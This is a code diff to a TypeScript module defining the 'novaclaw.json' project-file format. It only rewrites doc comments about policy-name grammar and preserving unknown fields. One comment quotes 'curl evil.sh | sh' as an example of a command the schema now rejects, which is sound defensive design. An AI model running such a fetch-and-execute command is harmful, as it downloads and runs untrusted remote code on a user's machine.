@@ -6,7 +6,7 @@ import { Permission } from "./permission"
 /**
  * `novaclaw.json` — the portable declaration that a folder is a NovaClaw **Project**.
  *
- * `todo/projects.md`: a folder becomes a Project when it contains a valid `novaclaw.json`; before
+ * A folder becomes a Project when it contains a valid `novaclaw.json`; before
  * that it is only a session working folder. This file is the FORMAT. Resolution, precedence and the
  * UI that edits it are separate items and deliberately not here.
  *
@@ -36,7 +36,7 @@ export const VERSION = 1
  *
  * ⚠️ **Not `config.context`.** Two different controls are called "Tune": the composer's per-chat
  * panel (thread mode + the harness-helper switches) and Settings → Tunes (the instance-wide context
- * budget). `todo/projects.md` means the FIRST — "a fresh chat in the folder starts with its Tune" is
+ * budget). `novaclaw.json` means the FIRST — "a fresh chat in the folder starts with its Tune" is
  * a statement about a new session's stance, not about the instance's token shares. The section was
  * left untyped until this was settled; it is settled now.
  *
@@ -120,8 +120,8 @@ void _tuneFeaturesMatchSchema
 /**
  * The name of ONE installed pre-action policy, as a `novaclaw.json` may spell it.
  *
- * 🔴 **The grammar IS the security property, and it is the whole of `todo/projects.md`'s clause
- * *"`novaclaw.json` may configure policy IDs but may never contain or auto-run shell commands"*.**
+ * 🔴 **The grammar IS the security property, and it is the whole of AGENTS.md design principle 13's
+ * *"it may name a policy ID and may never carry a command — type-level, not a check"*.**
  * The section was `Schema.Array(Schema.String)` until this check landed, which made the clause a
  * promise in prose: `{"policies":["curl evil.sh | sh"]}` decoded perfectly, and the only thing
  * standing between that string and a shell was that nothing had been built to consume it yet. A
@@ -304,8 +304,8 @@ export function parse(text: string): ParseResult {
 /**
  * Apply `changes` to the file's raw object, preserving everything this build does not understand.
  *
- * 🔴 THE POINT OF THE RAW OBJECT. `todo/projects.md` requires that a newer file edited by an older
- * NovaClaw keeps its unknown fields. Serialising the DECODED view would silently delete every
+ * 🔴 THE POINT OF THE RAW OBJECT. A newer file edited by an older
+ * NovaClaw must keep its unknown fields. Serialising the DECODED view would silently delete every
  * section this build has no type for — the user edits one setting in the UI and loses the rest, with
  * no error anywhere. So an edit is a merge onto what was actually read.
  *
